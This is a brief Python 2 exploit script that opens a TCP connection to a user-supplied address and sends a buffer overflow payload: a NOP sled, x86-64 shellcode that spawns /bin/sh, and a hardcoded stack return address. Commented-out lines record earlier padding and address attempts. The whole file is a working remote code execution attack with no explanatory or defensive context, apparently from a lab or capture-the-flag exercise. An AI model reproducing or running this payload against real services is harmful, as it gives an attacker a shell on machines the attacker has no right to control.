import socket # for socket 
import sys 
from struct import *

ip = sys.argv[1]
port = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect((ip, port)) 

buf = "A"*520
#buf = '\x90'*520
#520 - 27(len of shellcode) = 493
nopsled = '\x90'*493 
rip = "BBBBBB"
rip = pack("<Q",0x7fffffffdfc0)

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

#buf += pack("<Q", 0x000107f0)
#buf += pack("<Q", 0x0001079c)
#buf += pack("<Q", 0x0001081c)
#buf = "A"*1000 
#rip = 0x000107f0

#exploit = buf + rip + shellcode
exploit = nopsled + shellcode + rip

print exploit

s.send(exploit)

s.close()
